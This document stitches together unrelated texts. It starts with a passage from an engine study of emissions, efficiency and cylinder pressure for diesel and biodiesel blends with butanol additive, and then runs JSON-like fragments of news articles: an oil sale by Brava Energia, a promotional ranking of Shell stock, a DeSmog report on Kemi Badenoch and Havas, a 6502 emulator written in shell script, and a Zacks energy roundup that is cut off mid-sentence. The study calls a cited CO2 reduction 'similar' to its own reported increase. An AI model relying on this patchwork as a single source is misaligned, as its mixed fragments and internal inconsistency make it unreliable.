characteristics\n\nNitrogen oxide (NOx) emissions\n\nFigure 12 depicts the nitrogen oxide emission trends across multiple test fuels with optimal fuel injection circumstances and EGR rates at maximum load. When split injection, delayed timing, and EGR rate are combined, NO x emissions are significantly reduced across all load conditions. The delay in injection time causes the delayed combustion process, while exhaust gas recirculation, with its higher specific heat capacity, lowers the overall combustion temperature. As a result, peak cylinder pressure and temperature are reduced, resulting in decreased NO x emissions22. At full load, NO x emissions are reduced by 35.29% for diesel, 33.37% for CSLB5, and 29.14% for CSLB10 test fuels under ideal conditions. This is due to the reduced premixed burning rate after the delay period, which results in lower air entrainment and a slower fuel-air mixing rate, minimizing the NO x formation47.\n\nFig. 12 Comparative analysis of NO x emissions on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nThe addition of butanol helps to reduce NO x emissions significantly. This effect is caused by the additives\u2019 lower calorific content (33800 kJ/kg) and higher evaporation rate (626 kJ/kg), resulting in a delayed combustion process and subsequent decreases in maximum cylinder pressure and temperature. The lower combustion temperature inhibits reactivity among O 2 and N 2 , reducing NO x emission. It is worth noting that the additives\u2019 overall leaner combustion and cooling impact substantially influence minimizing NO x emissions48. While oxygen content in the additives may increase the premixed combustion temperature and hence increase NO x emissions, the cooling impact outweighs other effects, resulting in lower NO x emissions29. Adding butanol at 2.5%, 5%, and 10% concentrations to diesel, CSLB5 and CSLB10 at full load reduces NO x emissions. Notably, the 10% butanol addition significantly minimizes the NO x formations by 32.19%, 44.21%, and 46.37% for diesel, CSLB5 and CSLB10 fuels compared to ideal operating conditions. Similar trends are observed by Singh et al.31, who studied the 5%, 10%, and 15% n-butanol addition to eucalyptus biodiesel and diesel blends (B20), showing 21.90%, 23.60% and 25.16% decrease in NO x emission across top load conditions when compared to diesel, B100 and B20 blends. This is due to the high latent heat of vaporization of n-butanol, which induces a cooling effect during combustion, reducing in-cylinder pressure and temperature. In addition, the combustion duration of diesel/jojoba oil/butanol blends (DBJ15) is shorter than that of pure diesel fuel, which reduces the time available for NO x formation, thereby lowering NO x emissions as reported by EL-Seesy et al.35. These literature data indicate the beneficial effect of n-butanol additions on reducing NO x emissions in diesel and CSLB blends.\n\nSmoke emissions\n\nInternal combustion engine smoke emissions are primarily influenced by viscosity, uniform fuel-air mixture, availability of oxygen, and oxidation process time49,50. Figure 13 depicts the comparative analysis of smoke emissions among different test fuels at full load under ideal conditions. CSLB biodiesel blends, which have a lower sulfur concentration of 0.06%, emit less smoke than standard diesel fuel. Furthermore, for the investigated fuels, retarded timing and split injection strategies contribute to lower smoke emissions across all load conditions. However, as a result of the limited supply of oxygen, the use of EGR causes a modest increase in smoke emissions. The split injection improves fuel distribution and increases the regularity of the air-fuel mixture, reducing the presence of fuel-rich zones20. Due to this, smoke emissions are reduced by 15.52%, 2.72%, and 14.24% at full load under the ideal fuel injection and EGR conditions for diesel, CSLB5 and CSLB10 blends. Furthermore, the addition of butanol lowers smoke emissions even more. The enhanced oxygen concentration of the additions promotes oxidation by forming OH radicals, resulting in more complete combustion and lower smoke emissions27. At full load, blending 2.5%, 5%, and 10% butanol with diesel minimizes smoke emissions by 28.49%, 36.67%, and 45.48%. Similar trends are found across all load conditions when the additives are added to CSLB5 and CSLB10 blends. Notably, 26.56%, 28.98%, and 34.11% smoke reductions were observed for CSLB5, adding butanol by 2.5%, 5% and 10%, respectively. The further reduction in smoke was identified with the CSLB10 blend with 2.5%, 5% and 10% butanol additives by 5.46%, 9.57%, and 14.02% compared with ideal settings. These findings highlight the ability of butanol additives to reduce smoke emissions in diesel and CSLB blends effectively. Chen et al.51 observed a similar trend in smoke opacity emissions when n-butanol was added to a diesel mixture under full-load conditions, resulting in a 10.91% reduction in smoke opacity compared to other alcohols. This reduction is attributed to n-butanol\u2019s lower viscosity, superior fuel atomization, and smaller fuel droplet size, contributing to decreased exhaust gas opacity. Pullagura et al.37 reported a 35.12% reduction in smoke opacity when using butanol in sea mango biodiesel/diesel blends compared to diesel fuel under higher load conditions.\n\nFig. 13 Comparative analysis of Smoke emissions on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nCarbon monoxide (CO) emissions\n\nFigure 14 compares CO emissions among various fuels at full load under ideal conditions. Implementation of delayed injection time, split fuel injection, and optimal EGR rate significantly reduces CO emissions. Retarded injection timing increases mixing duration, resulting in decreased CO emissions. Split injection results in a more homogenous mixture, eliminating fuel-rich zones and helping to reduce CO levels16. CO levels are minimized by 18.91% for diesel, 20.42% for CSLB5, and 26.92% for CSLB10 test fuels at full load under ideal conditions. Carbon monoxide emissions decreased considerably with butanol blends of 2.5%, 5%, and 10% in diesel fuel for 8.69%, 12%, and 16.82%, respectively. This reduction can be due to the increased spray characteristics, atomization, mixture quality, and combustion efficiency made possible by the additives\u2019 lower density and viscosity52. The additives\u2019 higher oxygen concentration improves combustion and reduces fuel-rich zones, which helps to reduce CO emissions29. Furthermore, when the amount of butanol in the mixture increases, the carbon content decreases, resulting in a lower carbon-to-hydrogen (C/H) ratio and reducing CO emissions. At full load, adding 2.5%, 5%, and 10% butanol with CSLB5 results in a 14%, 18.08%, and 26.86% reduction in CO emissions. The CSLB10 blend showed maximum CO reduction of 10.34%, 13.04%, and 18.18% under ideal conditions. Similar trends are found across all load conditions when the additives are added to CSLB blends. The inclusion of 10% isobutanol in the subabul seed biodiesel/diesel blend (B20) resulted in a 4.12% reduction in CO emissions at full load compared to diesel fuel. The additional oxygen content in isobutanol enhances combustion efficiency and promotes more complete fuel oxidation, potentially reducing CO emissions, as reported by Yamini et al.53.\n\nFig. 14 Comparative analysis of CO emissions on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nCarbon dioxide (CO 2 ) emissions\n\nFigure 15 compares CO 2 emissions among various fuels under ideal full-load conditions. With the application of split injection and EGR, there is a marginal rise in CO 2 emissions. Split injection strategies contribute to somewhat greater CO 2 emissions while enhancing mixture quality and boosting complete combustion. Similarly, using EGR raises the charge temperature, which causes carbon monoxide (CO) oxidation into carbon dioxide (CO 2 ), contributing to higher CO 2 emissions8. At maximum load, CSLB5 and CSLB10 blends emit around 9.27% and 9.79% more CO 2 than the baseline value. Using butanol additives to the CSLB fuels results in a modest rise in CO 2 emissions compared to the ideal base diesel tests. This rise may be due to the additives\u2019 higher O 2 availability, which promotes more efficient combustion26. Furthermore, the fuel\u2019s lower viscosity helps the mixing process, allowing for a faster oxidation reaction and contributing to increased CO 2 emissions. It is worth mentioning, however, that the percentage of additives used in fuels is constrained to 10% since a higher percentage can reduce carbon content, potentially compromising the combustion process54. Remarkably, adding additives to pure diesel has no discernible effect on CO 2 emissions. However, adding 10% butanol to CSLB blends slightly increases CO 2 emissions by 7.28% and 8.84% at full load. A similar result was reported by Hassan et al.36, where the presence of n-butanol in a biodiesel blend reduced CO 2 emissions. This reduction is attributed to the lower carbon-to-hydrogen ratio of alcohol compared to neat biodiesel or diesel.\n\nFig. 15 Comparative analysis of CO 2 emissions on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nHydrocarbon (HC) emissions\n\nFigure 16 compares HC emissions among various fuels under ideal full-load conditions. HC emissions increase as injection timing is retarded and at various EGR rates. Because of the delayed timing, the combustion continues up to the initial stages of the power stroke. This influences the HRR and combustion of fuel temperature, resulting in increased HC formation22. Similarly, using EGR reduces combustion temperatures and decreases O 2 availability, which influences hydrocarbon oxidation and contributes to increased HC emissions. Under ideal fuel injection and EGR settings, HC emissions rise by 9.02% for diesel, 7.78% for CSLB5, and 8.45% for CSLB10 test fuels at peak load. Notably, using butanol additives results in a slight reduction in HC emissions in diesel and CSLB blends. The maximum HC reduction was observed in the CSLB10 blend with 2.5%, 5% and 10%, butanol addition resulted in lower HC by 14.52%, 24.56%, and 39.21%, respectively. This reduction can be due to additives\u2019 increased atomization, improved mixture quality, and improved flame propagation. The occurrence of oxygen atoms in the butanol additives accelerates hydrocarbon combustion55. Furthermore, the split fuel injection approach aids in producing a uniform blend, minimizing HC emissions substantially. However, HC emissions remain higher than the baseline values. The increase in HC emissions for the butanol/diesel mixture is more pronounced at low loads compared to high loads. This is due to the high latent heat of vaporization of the butanol/diesel mixture, which reduces droplet evaporation efficiency and leads to incomplete combustion near low-temperature walls, resulting in higher HC emissions at low loads. However, these effects are mitigated under high-load conditions, as reported by Chen et al.51.\n\nFig. 16 Comparative analysis of HC emissions on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nCRDI engine performance characteristics\n\nBrake-specific energy consumption (BSEC)\n\nFig. 17 Comparative analysis of BSEC on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nBrake-specific energy consumption (BSEC), expressed in MJ/kW-hr, is an essential metric for evaluating engine performance since it measures the energy required to create 1 kW of BP. Figure 17 compares BSEC among various fuels under ideal full-load conditions. Ideal operating circumstances result in a large rise in BSEC. This increase might be attributed to delayed injection timing, which prolongs combustion56. Furthermore, the application of EGR has a diluting effect on the A/F ratio and fuel ignition, contributing to the reported increase in BSEC. Specifically, at maximum load and under ideal fuel injection conditions and EGR rate, BSEC rises by 22.06%, 25.21%, and 30.94% to the CSLB5, CSLB10, and diesel blends. The butanol additives\u2019 lesser viscosity and enhanced oxygen concentration promote better atomization, resulting in complete combustion and reduced BSEC. Moreover, the split injection approach decreases cylinder heat losses and assures effective fuel distribution, resulting in a more uniform air-fuel mixture and increased combustion efficiency, contributing to the lower BSEC16. Notably, adding 10% butanol to diesel, CSLB5 and CSLB10 blend at full load results in a maximum reduction of BSEC by 17.81%, 18.11% and 16.18% than ideal conditions. Similar trends are observed across all load conditions with the usage of 2.5% and 5% butanol additives. Sayyed et al.57 confirmed that the addition of butanol to diesel/Karanja biodiesel blends resulted in lower brake-specific energy consumption (BSEC) compared to other biodiesel blends. This reduction is attributed to the optimized density and viscosity of the fuel blends, which enhance atomization and combustion efficiency, leading to reduced BSEC under peak load conditions.\n\nBrake thermal efficiency (BTE)\n\nFigure 18 compares BTE among various fuels under ideal full-load conditions. The split injection is advantageous because it encourages the development of a homogenous mixture, which reduces heat losses and increases BTE. In contrast, delayed injection timing and using EGR result in a minor decrease in thermal efficiency. This is due to the delayed start of injection caused by the retarded timing, which results in a decrease in total power developed20. Additionally, EGR affects flame temperature because exhaust gases have a larger heat capacity, and less oxygen is available, which affects ignition and, consequently, engine performance. Under ideal fuel injection and EGR conditions, BTE decreases for diesel, CSLB5, and CSLB10 blends, which are 7.91%, 6.24%, and 5.35%, respectively, compared to baseline. The use of butanol additives increases BTE when compared to ideal conditions. Notably, diesel with 2.5%, 5%, and 10% butanol gradually increment the BTE of 2.14%, 3.15% and 2.13%, respectively. Similar tendencies are found across all top load conditions when butanol additives are introduced into CSLB blends. It can be ascribed to many variables, including increased spray properties, enhanced fragmentation and oxygen content, contribute to more effective combustion and, as a result, higher BTE. Also, the lower combustion temperature caused by the presence of butanol reduces heat losses, improving total engine efficiency27. It is worth noting that the additive proportion is limited to 10% due to the potential detrimental impact on CRDI engine performance caused by the additives\u2019 low energy content and higher latent heat. When 10% butanol is added to diesel at full load, BTE improves and reaches a level comparable to the baseline data. Although the addition of butanol improves the viscosity and density of the fuel, the resulting brake thermal efficiency (BTE) remains close to the baseline and ideal conditions. However, Singh et al.31 reported that the higher BTE observed in butanol-blended B20 fuels is attributed to their higher oxygen content and improved air-fuel atomization. Additionally, lower viscosity and density enhance fuel vaporization, facilitating better utilization of thermal energy.\n\nFig. 18 Comparative analysis of BTE on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nCRDI engine combustion characteristics\n\nMaximum cylinder pressure (P max )\n\nFig. 19 Comparative analysis of P max on diesel, CSLB5 and CSLB10 fuel blends with different % butanol additive. Full size image\n\nFigure 19 compares maximum cylinder pressure among various fuels under ideal full-load conditions. Retarded injection timing contributes to a delayed combustion process, resulting in lower peak P max and temperature56. However, using EGR in addition to split injection helps alleviate this disadvantage to some extent. As a result, peak P max decreases with diesel for 10.73%, CSLB5 for 10.06%, and CSLB10 for 11.89%, respectively, compared to baseline readings under the ideal fuel injection and EGR conditions. To address this issue, the use of butanol additives with different percentages (2.5%, 5%, and 10%) becomes desirable for all load conditions. However, using additives causes a slight rise in peak P max compared to the optimal conditions. The higher O 2 availability and reduced viscosity of the additives improve combustion dynamics, resulting in higher maximum pressure and more heat output during the diluted phase29. A 10% addition of butanol to diesel, CSLB5 and CSLB10 rises peak P max by 5.62%, 5.46%, and 8.21%. Similar increasing P max trends are observed across all load conditions with the usage of 2.5% and 5% butanol additives. When fuel additives like butanol are blended with a B20 fuel blend, they can enhance the overall combustion process by reducing ignition delay. The addition of butanol has been shown to shorten ignition delay, promoting faster and more efficient combustion, which results in a higher peak pressure (P max ), as reported by Yamini et al.53.\n\nHeat release rate (HRR)\n\nFig. 20 Comparative analysis of average HRR of three different test blends with different % butanol additive.

            "content": "Brava Energia S.A. has signed a contract with Shell Western Supply and Trading Limited for the sale of the oil produced in the Atlanta field by the consortium of Brava and Westlawn.\n\nAtlanta, a producing heavy oil field located in ultra-deepwater in Brazil, is owned by Brava with an 80 percent stake and Westlawn with 20 percent.\n\nThe contract \u201cprovides for flexible conditions that allow the sharing of logistical and operational gains with the pricing policy linked to reference prices for low-sulfur bunker fuel on the international market,\u201d Brava said in a news release.\n\nEarlier in the month, Brava\u2019s board said that the scope of the possible divestment transaction of the company's onshore and shallow water assets will be limited to the fields located in the state of Bahia in Brazil.\n\nThe company said it remains in negotiations and in the due diligence phase with the selected bidders, with the expectation of receiving binding proposals throughout the month of April.\n\nBrava highlighted that the optimization of the portfolio, initiated with the signing of a contract for the sale of 11 concessions in Rio Grande do Norte, \u201caims to concentrate the company's efforts on projects with higher profitability and scale, which present efficient logistical integration and access to the international market\u201d.\n\nThe company signed a contract for the sale of 6 million barrels of oil produced by the consortium in Atlanta with Trafigura PTE in February.\n\nThe contract has flexible terms that allow profit sharing through cargo combinations, access to specific markets for Atlanta oil type and competitive financing lines, Brava said in an earlier statement. The oil pricing is tied to international low-sulfur bunker reference prices.\n\nPotiguar Divestment\n\nThe company in January received proposals from companies interested in acquiring assets from its onshore and shallow water portfolio.\n\nIn February, Petro-Victory Energy Corp. announced the acquisition of 13 oil fields in Rio Grande do Norte, located in the Potiguar Basin of Brazil, from Brava.\n\nPetro-Victory signed a sale purchase agreement, with a 50/50 partnership with Azevedo & Travassos Petroleo (ATP), for the acquisition of Polo Porto Car\u00e3o and Polo Barrinha from Brava Energia subsidiaries 3R RNCE S.A. and 3R Potiguar S.A.\n\nThe Calgary, Alberta-based company signed an exclusivity agreement with Brava for the assets in December 2024.\n\nThe total acquisition value for the assets is $15 million, net $7.5 million for Petro-Victory, it said in a news release. The payment will be made in four tranches plus a gross overriding royalty, of which Petro-Victory\u2019s contribution will be pro-rated at 50 percent working interest.\n\nThe transaction is expected to close in the second half of 2025, subject to customary closing conditions and regulatory approvals from the National Agency of Petroleum in Brazil, the company said.\n\nThe 13 oil fields, with fully operational production facilities comprising 38,301 acres, are \u201cstrategically located adjacent to Petro-Victory\u2019s existing assets,\u201d it said. The assets have current production of 250 barrels of oil per day, with a high-impact work program underway to increase oil production. Brazil\u2019s National Agency of Petroleum has reported a volume of oil in place of 125 million barrels, with a recovery factor of 13.3 percent, according to the release.\n\nTo contact the author, email rocky.teodoro@rigzone.com",

            "content": "U.S. markets have struggled with volatility as trade tensions and economic uncertainties persist. The Magnificent Seven tech stocks have lost momentum, and recent economic projections indicate a potential slowdown. President Donald Trump\u2019s tariff policies continue to introduce unpredictability, prompting investors to seek alternatives. European stocks, offering lower valuations and higher dividend yields, have emerged as an attractive option against this backdrop. With the recent Purchasing Managers\u2019 Index (PMI) showing the eurozone\u2019s manufacturing contraction easing to its mildest level in two years, investor confidence in the region has strengthened.\n\nAccording to CNBC, Eurozone inflation eased to 2.4% in February, aligning with expectations ahead of the European Central Bank\u2019s upcoming policy decision. The euro also rebounded, rising nearly 1% against the dollar after earlier declines. Meanwhile, discussions around a \u20ac500 billion infrastructure investment plan in Germany have fueled speculation about a broader fiscal expansion, further enhancing Europe\u2019s market appeal.\n\nA primary driver of Europe\u2019s market rally has been increased defense spending, as reported by World Economic Forum (WEF). Following a Ukraine peace summit hosted by UK Prime Minister Keir Starmer, European leaders pledged to boost military investments, propelling the broad measure of the European equity market up 1% and the aerospace and defense index by 6.5%. Germany\u2019s blue-chip index also climbed 0.9% amid reports of a potential defense fund. CNBC reported a recent upgrade by HSBC of European stocks to \u201cOverweight\u201d while the downgrading of U.S. equities to \u201cNeutral\u201d showcases a fundamental shift in economic narratives and a game-changing fiscal stimulus in the eurozone.\n\nOn March 12, European markets opened on a high note, surging after the European Union revealed its retaliatory tariffs on U.S. steel and aluminum imports. While U.S. indices have been struggling with continued uncertainty, European equities gained momentum, driven by geopolitical developments, fiscal stimulus, and shifting investor sentiment. With renewed commitments to defense spending, easing inflation, and a more attractive valuation landscape compared to U.S. stocks, European markets are increasingly capturing investor interest. The big question now is whether this momentum is here to stay or if Europe is simply enjoying a momentary surge.\n\nWe recently published a list of 10 Best European Stocks to Buy According to Billionaires . In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other best European stocks to buy according to billionaires.\n\nStory Continues\n\nHowever, risks remain. The recently brokered U.S.-Ukraine ceasefire agreement could shift geopolitical dynamics. Additionally, European equities have faced headwinds, with a recent sell-off in tech stocks and concerns about Germany\u2019s fiscal policies. While Europe\u2019s market rally is notable, its long-term trajectory will depend on economic resilience, policy decisions, and global trade developments.\n\nWith billionaire investors increasingly reallocating capital toward European stocks, the region is experiencing a renewed investment focus. The recent UBS Billionaire Ambitions Report finds that 43% of billionaires plan to expand their investments in real estate, while 42% are increasing exposure to developed market equities. Simultaneously, they are allocating more capital to perceived safe-haven assets. Whether this marks a fundamental shift or a temporary rebalancing remains to be seen, but for now, Europe is firmly in the spotlight. By using key themes from billionaire portfolios, investment strategies can be streamlined for long-term resilience.\n\nIs Shell plc (SHEL) the Best European Stock to Buy According to Billionaires?\n\nA gas refinery lit up against the night sky, showing the scale of the company's petrochemical operations.\n\nOur Methodology\n\nWe analyzed Insider Monkey\u2019s exclusive database of billionaire stock holdings to compile our list of the best European stocks to invest in according to billionaires. We searched European companies that trade on the NASDAQ and NYSE stock exchanges and picked the 10 best stocks to buy based on the highest number of billionaire investors, updated as of Q4 2024. For the stocks with the same number of billionaire holdings, we have used the total value of billionaire holdings as a secondary metric to rank the stocks. These billionaires are founders or managers of some of the world\u2019s leading hedge funds and companies.\n\nWhy are we interested in the stocks that hedge funds pile into? The reason is simple: our research has shown that we can outperform the market by imitating the top stock picks of the best hedge funds. Our quarterly newsletter\u2019s strategy selects 14 small-cap and large-cap stocks every quarter and has returned 373.4% since May 2014, beating its benchmark by 218 percentage points (see more details here).\n\nShell plc (NYSE:SHEL)\n\nNumber of Billionaires: 14\n\nShell plc (NYSE:SHEL) is a global energy and petrochemical company headquartered in London, operating across more than 70 countries. Its diverse portfolio includes the exploration and production of oil and natural gas, the manufacturing and marketing of chemicals and petrochemicals, and a growing presence in renewable energy solutions.\n\nShell plc (NYSE:SHEL) reported adjusted earnings of $3.66 billion for the latest quarter, falling short of the anticipated $4.10 billion, primarily due to lower oil prices and refining margins. Despite this, the company announced a $3.5 billion share buyback program, reflecting robust cash-flow generation. Additionally, Shell increased its dividend by 4% to $0.358 per share. Financially, the company\u2019s full-year 2024 results showed a decline in sales to $284.3 billion from $316.6 billion the previous year, with net income decreasing to $16.1 billion from $19.4 billion.\n\nShell plc (NYSE:SHEL) is reportedly considering the sale of its chemical assets in both Europe and the United States, including the Deer Park facility near Houston. This potential divestment is part of a broader review of Shell\u2019s chemical operations following significant workforce reductions and recent financial challenges in its chemicals business.\n\nShell plc (NYSE:SHEL) has faced some headwinds, with its share price declining by 2.7% over the past month. However, the company\u2019s long-term fundamentals remain strong. Over the past five years, Shell has delivered an impressive 175.5% return, reflecting its ability to generate consistent revenue growth. Analysts remain overwhelmingly bullish on the stock, with 90% of the 31 analysts covering Shell assigning it a \u201cBuy\u201d rating.\n\nOverall, SHEL ranks 4th on our list of best European stocks to buy according to billionaires. While we acknowledge the potential for SHEL as an investment, our conviction lies in the belief that some AI stocks hold greater promise for delivering higher returns and doing so within a shorter time frame. If you are looking for an AI stock that is more promising than SHEL but trades at less than 5 times its earnings, check out our report about the cheapest AI stock.\n\nREAD NEXT: 20 Best AI Stocks To Buy Now and 30 Best Stocks to Buy Now According to Billionaires.\n\nDisclosure: None.

            "content": "Conservative leader Kemi Badenoch today ditched her party\u2019s commitment to the UK\u2019s flagship climate target in a speech hosted by an advertising group that works for Shell, DeSmog can reveal.\n\nDuring her address, Badenoch suggested that we are \u201cbankrupting ourselves\u201d in the pursuit of reaching net zero emissions by 2050. She said that the country should still seek to reduce its climate impact, but shouldn\u2019t set a date for achieving net zero.\n\nBadenoch said that Britain has \u201cthe highest electricity bills in the developed world\u201d \u2013 which is caused by expensive gas prices rather than the cost of renewables \u2013 and claimed that the UK is \u201conly responsible for 1 percent of global emissions\u201d. In reality, taking into account its colonial history, the UK is responsible for more than five times this figure.\n\nThe Tory leader, who has received recent donations from fossil fuel interests and climate science deniers, made her speech at the Havas Village in King\u2019s Cross, London, and was introduced by H/Advisors CEO Neil Bennett.\n\nH/Advisors is owned by Havas \u2013 one of the world\u2019s largest public relations and advertising agencies, based in France. Bennett said he was \u201cdelighted\u201d to welcome Badenoch to the Havas campus for her speech, to ensure the company stays \u201cat the heart of public debate\u201d.\n\nIn September 2023, news broke that Havas had won a major Shell advertising contract \u2013 a move condemned by climate campaigners.\n\nSubscribe to our newsletter Stay up to date with DeSmog news and alerts Email Address What content do you want to subscribe to? (check all that apply) All International UK Sign Up\n\nShell is still committed to exploring for new sources of oil and gas and does not have any plans to reduce the overall amount it produces by 2030. In 2021, the District Court of the Hague found that the total CO2 emissions of the Shell group exceeded the emissions of many states, including the Netherlands.\n\nIn August, the UK\u2019s Advertising Standards Authority watchdog began reviewing a Shell campaign produced by Havas that ran on UK television in the first half of the year. The campaign had prompted complaints that it painted a misleading picture of the Shell\u2019s role in the energy transition.\n\nIn October 2023, Havas CEO Yannick Bollor\u00e9 told Campaign that he had been happy to pitch for the Shell account, saying \u201cwe believe the most effective change comes from within.\u201d\n\n\u201cWe won\u2019t participate in any greenwashing whatsoever and we will accompany [Shell] and help achieve their transition,\u201d Bollor\u00e9 said.\n\nIn July 2024, four Havas agencies were stripped of their \u201cB Corp\u201d status for high environmental, ethical, and governance standards following complaints raised over the company\u2019s Shell contract.\n\nH/Advisors bid for Shell\u2019s global public relations account last year, although the work eventually remained in the hands of Edelman .\n\nHavas has worked with a number of fossil fuel clients in recent years, although the company had seemed on track to reduce its involvement with polluters, prior to the 2023 Shell contract.\n\nThe firm has worked in various capacities for BP, Kuwait Petroleum International, and TotalEnergies since 2019, while Imperial Oil and Gas was a H/Advisors client in 2023.\n\n\u201cLet\u2019s not forget that it was the Tories that legally enshrined the 2050 net zero target,\u201d said Agustina Olivieri, Good Law Project head of digital communications, \u201cbut they never acted on this seriously \u2013 as Good Law Project helped to expose in successive High Court battles.\n\n\u201cAnd now with a nihilist in the White House and fossil fuel funding filling their coffers as their impetus, Badenoch\u2019s party have spinelessly decided to drop it altogether.\u201d\n\nH/Advisors, Havas, and Shell were approached for comment.\n\nBadenoch\u2019s Climate Denial Ties\n\nWhile serving in the last Conservative government, Badenoch described the 2050 net zero emissions target as \u201ccrucial\u201d. However, her support for the policy has waned in more recent times.\n\nThe Tory premier, who was elected to the role in November, received funding and office space during her leadership campaign from Neil Record , chair of Net Zero Watch , the campaign arm of the Global Warming Policy Foundation (GWPF) \u2013 the UK\u2019s foremost climate science denial group.\n\nRecord \u2013 who is also lifetime president of the Institute of Economic Affairs (IEA), a think tank that received funding from BP every year from 1967 to at least 2018 \u2013 in July wrote that achieving net zero by 2050 \u201cwill restrict our freedom, and is likely to be eye-wateringly expensive\u201d. Record has donated to both the IEA and GWPF.\n\nOver the past two decades, the Conservative Party has accepted \u00a37.2 million from senior figures at the GWPF.\n\nBadenoch also received \u00a310,000 during her leadership campaign from House of Lords member Dambisa Moyo, who is a director at the fossil fuel giant Chevron.\n\nA press release from the GWPF celebrated Badenoch\u2019s statement today, saying that it could have been drafted by the group\u2019s late founder Nigel Lawson \u201calmost verbatim\u201d.\n\nGreen groups were not so enthusiastic. \u201cToday marks a dark day in the history of the Conservative Party,\u201d said Ed Matthew, director of the UK programme for climate change think tank E3G. \u201cBy abandoning net zero by 2050, Badenoch has sold out the interests of the British people to the fossil fuel industry.\n\n\u201cThis is an act of political cowardice and it will not fool the British people or British business, who strongly support ambition climate action. The price will be electoral oblivion.\u201d",

It has an integrated interactive debugger, with breakpoints, single stepping, and a myriad of other features.\"\n\nSure, you've seen a 6502 emulator before \u2014 but have you ever seen one written as a shell script? (\ud83d\udcf7: Caleb Connolly)\n\nThe MOS Technology 6502, developed by Chuck Peddle and colleagues and launched in 1975 as the at-the-time cheapest microprocessor around, has a long and storied history as the driving force behind some of the biggest names in personal computing: Apple's early systems, Commodore's 64 family, the BBC Micro, and even consoles like the Atari 2600 and Nintendo Entertainment Systems (NES) were powered by the chip, which is still in production at Western Design Center (WDC) today.\n\nWhile you can still get your hands on real-silicon 6502s, it's also a heavily-emulated and -replicated part: emulators for almost every 6502-based system are readily available, as are FPGA recreations of the chip; four years ago PragmatIC launched a reimplementation built on a fully-flexible substrate. Connolly's recreation is strictly a software emulation, but in an usual medium: a BusyBox ash-shell compatible shell script.\n\n\"Loading the ROM was a bit of a headscratcher, for a while I did something really cursed reading hexdump output into a variable and then using subshells and calling memset for each byte but this was PAINFULLY slow,\" Connolly writes of some of the challenges experienced in writing the emulator. \"Then I discovered that BusyBox hexdump is actually really powerful, and it can directly output in the format I picked.\n\nThe project includes built-in unit tests, and can run Steve Wozniak's monitor, wozmon, and a BASIC ROM. (\ud83d\udcf7: Caleb Connolly)\n\n\"If you run with the -d flag then all the debug logs get written to a socket,\" Connolly adds, \"so you can interact with the emulator and see the instructions being decoded and executed in a second terminal. This felt super cool to implement and have actually work. Often times one terminal just isn't enough for all the logging you want.\"\n\nThe project's source code is available on Codeberg under an unspecified license; technical details of its implementation can be found in Connolly's Mastodon thread.",

            "content": "The Phase 4 development\u2019s contributions to global energy production are significant as SHEL continues to expand its portfolio of upstream projects. This expansion is in line with the company\u2019s strategic goals for 2023-2025, which include bringing several major upstream projects online. By 2025, SHEL anticipates a peak production of an additional 500,000 barrels of oil equivalent per day (boe/d) from these new developments. (Shell Starts Oil Production From Gumusut-Kakap Phase 4 Project)\n\nThe Gumusut-Kakap project, located off the coast of Sabah, Malaysia, represents one of SHEL\u2019s most ambitious and successful offshore ventures. The recently launched Phase 4 is set to further solidify the company\u2019s position in Malaysia\u2019s rapidly growing offshore oil industry. For SHEL, this development is key to its broader strategy to boost output and support global energy demands.\n\n1. Shell , one of the largest oil and gas supermajors, has announced the commencement of the first oil production from the Phase 4 expansion of its deepwater Gumusut-Kakap-Geronggong-Jagus East offshore project in Malaysia. This breakthrough highlights SHEL's continued commitment to bolstering upstream operations, particularly in deepwater oil exploration, as it adapts to the evolving global energy landscape.\n\nMeanwhile, the dramatic rise in natural gas prices was fueled by expectations of cold weather in the remainder of the winter withdrawal season.\n\nOverall, it was a mixed seven-day period for the sector. West Texas Intermediate (WTI) crude futures decreased around 3.9% to close at $67.04 per barrel, but natural gas prices jumped some 15% to end at $4.40 per million British thermal units (MMBtu).\n\nThe headlines revolved around energy biggie Shell \u2019s first oil production from a deepwater project offshore Malaysia and Chevron \u2019s Venezuela setback. Developments associated with The Williams Companies , Liberty Energy and VAALCO Energy also grabbed attention.\n\nChicago, IL \u2013 March 17, 2025 \u2013 Zacks.com announces the list of stocks and ETFs featured in the Analyst Blog. Every day the Zacks Equity Research analysts discuss the latest news and events impacting stocks and the financial markets. Stocks recently featured in the blog include: Shell SHEL, Chevron CVX, The Williams Companies WMB, Liberty Energy LBRT and VAALCO Energy EGY.\n\nStory Continues\n\n2. U.S. energy major Chevron has received a 30-day notice from the Trump administration to stop pumping and selling Venezuelan oil and wrap up its operations in the country. The deadline, set for April 3, provides the company only 30 days instead of the normal six-month wind-down period.\n\nSince 2022, Chevron has been allowed to operate in Venezuela as an exception to U.S. sanctions, exporting crude to the United States and recovering billions in pending debt. However, with the new directive, the company must halt its operations.\n\nA similar wind-down order was provided by Trump\u2019s administration in 2020, which allowed Chevron to continue production in Venezuela but banned its exports or imports to the United States. (Chevron Gets Short 30 Days Notice to End Venezuela Operations)\n\n3. Leading midstream operator The Williams Companies recently announced a significant $1.6 billion agreement to develop onsite natural gas and power generation infrastructure for an undisclosed investment-grade company. The project, anticipated to be completed in the second half of 2026, will enhance power availability in grid-constrained markets, ensuring a reliable energy supply. This venture marks Williams\u2019 first major step into power innovation, reinforcing its commitment to delivering fast, efficient solutions to high-demand regions.\n\nWMB is well-positioned to capitalize on the rising demand for natural gas, driven significantly by the increasing energy needs of artificial intelligence and data centers. With its existing network handling a third of the U.S. natural gas and significant expansion projects in the pipeline, the company is set to benefit from favorable industry dynamics and growth prospects.\n\nPer the terms of the agreement, Williams has agreed to invest about $1.6 billion to provide natural gas and power pipeline infrastructure to an investment-grade company. The project is anticipated to be completed by the second half of 2026, provided the company receives all the required permits on time. (Williams Inks $1.6B Deal to Provide Natural Gas & Power Infrastructure)\n\n4. Oilfield service provider Liberty Energy has announced the acquisition of IMG Energy Solutions (\u201cIMG\u201d), a well-established developer of distributed power systems. This strategic move enhances Liberty Power Innovation, a division of LBRT, by incorporating IMG\u2019s expertise in engineering design, construction management, software control systems and power marketing. The acquisition allows LBRT to expand its energy solutions portfolio, particularly in the PJM market, where IMG has a strong presence.\n\nWith more 